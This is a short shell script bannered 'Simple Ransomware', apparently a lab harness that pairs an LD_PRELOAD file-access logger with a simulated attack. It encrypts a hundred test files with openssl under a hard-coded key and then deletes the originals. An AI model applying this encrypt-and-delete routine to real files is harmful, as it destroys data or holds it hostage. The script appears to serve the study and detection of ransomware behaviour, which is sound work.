#!/bin/sh

echo "+-----------------------------------------------------------------------+"
echo "|         ╔═══╗      ╔╗        ╔═══╗                                    |"
echo "|         ║╔═╗║      ║║        ║╔═╗║                                    |"
echo "|         ║╚══╦╦╗╔╦══╣║╔══╗    ║╚═╝╠══╦═╗╔══╦══╦╗╔╦╗╔╗╔╦══╦═╦══╗        |"
echo "|         ╚══╗╠╣╚╝║╔╗║║║║═╣    ║╔╗╔╣╔╗║╔╗╣══╣╔╗║╚╝║╚╝╚╝║╔╗║╔╣║═╣        |"
echo "|         ║╚═╝║║║║║╚╝║╚╣║═╣    ║║║╚╣╔╗║║║╠══║╚╝║║║╠╗╔╗╔╣╔╗║║║║═╣        |"
echo "|         ╚═══╩╩╩╩╣╔═╩═╩══╝    ╚╝╚═╩╝╚╩╝╚╩══╩══╩╩╩╝╚╝╚╝╚╝╚╩╝╚══╝        |"
echo "+-----------------╚╝----------------------------------------------------+"

dir="$1"					#assign given path to variable
x="$2"						#assign number of files to variable

# script_path=$(pwd)			#assign pwd to script path

# cd ~						#cd to home dir

# directories=`find $(pwd) -maxdepth 10 -type d -not -path '*/\.*' | sort`


# for i in $directories
# do
#     cd "$i"

#     if [ -d $dir ]; then

# 	    cd "$dir"
# 	    dir_path=$(pwd)
# 	    break

# 	fi
# done


# cd "$script_path"

export LD_PRELOAD=./logger.so

./test_ransomware "$dir" $x


for i in `seq 1 100`				#encrypt X files
do
   openssl enc -aes-256-cbc -in "$(echo "$dir")/file_$(echo "$i").txt" -out "$(echo "$dir")/file_$(echo "$i").txt.encrypt" -k 2013030115 2> /dev/null
done

for i in `seq 1 100`				#delete X original files
do
	rm "$(echo "$dir")/file_$(echo "$i").txt"
done

echo "|                           The Job is Done                             |"
echo "+-----------------------------------------------------------------------+"

# for i in `seq 1 $x`			#decrypt X files
# do
# 	openssl aes-256-cbc -in "$(echo "$dir")/file_$(echo "$i").txt.encrypt" -out "$(echo "$dir")/file_$(echo "$i")_decrypted.txt" -d -k 2013030115 2> /dev/null
# done
